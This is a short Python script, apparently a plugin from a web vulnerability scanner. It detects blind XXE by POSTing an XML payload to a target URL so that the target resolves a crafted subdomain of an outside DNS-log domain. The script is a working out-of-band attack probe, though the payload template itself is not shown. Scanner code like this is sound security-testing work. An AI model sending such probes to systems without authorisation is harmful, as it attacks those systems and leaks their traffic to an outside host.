#!/usr/bin/env python
# coding=utf-8


import requests
import urlparse
from config import *


def verify(task):
    """
    this function aim to detect the blind xxe.
    """
    prefix = "xxe_"
    dnslog = ".devil.yoyostay.top"
    url = task["url"]
    _ = urlparse.urlparse(url)
    # deal the path
    path = _.path
    if path.split("/")[-1].find(".") > 0: # if contains xx.html
        path = "/".join(path.split("/")[:-1])
    else:
        path = path
    target = prefix + _.netloc.replace(".", "_") + path.replace("/", "_") + dnslog
    logger.info("[xxe] [target={}]".format(target))

    xxe_xml = XXE_payload.format(target)
    headers = task["request_header"]
    headers["Content-Type"] = "application/xml"
    try:
        requests.post(task["url"],data=xxe_xml, headers=headers)
    except Exception as e:
        logger.error("[xxe] [error={}]".format(repr(e)))
    return (False, {})

